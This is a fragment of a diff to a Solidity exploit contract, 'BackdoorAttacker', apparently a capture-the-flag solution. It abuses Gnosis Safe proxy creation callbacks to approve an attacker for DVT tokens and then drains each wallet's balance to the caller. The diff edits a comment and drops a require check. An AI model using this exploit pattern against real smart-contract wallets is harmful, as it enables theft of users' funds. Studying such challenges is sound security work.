@@ -23,7 +23,8 @@ contract BackdoorAttacker {
             address[] memory owners = new address[](1);
             owners[0] = beneficiaries[i];
 
-            // In the "to" call we can approve our exploiter contract
+            // Set "to" to us. The GnosisSafeProxy will deletegate call to our `receveSetupCall` function
+            // where we can do a DVT.approve for the attacker.
             GnosisSafeProxy proxy = factory.createProxyWithCallback(
                 singleton,
                 abi.encodeWithSelector(
@@ -41,10 +42,7 @@ contract BackdoorAttacker {
                 walletRegistry
             );
 
-            require(
-                dvt.transferFrom(address(proxy), msg.sender, dvt.balanceOf(address(proxy))),
-                "transferFrom failed"
-            );
+            dvt.transferFrom(address(proxy), msg.sender, dvt.balanceOf(address(proxy)));
         }
     }
 
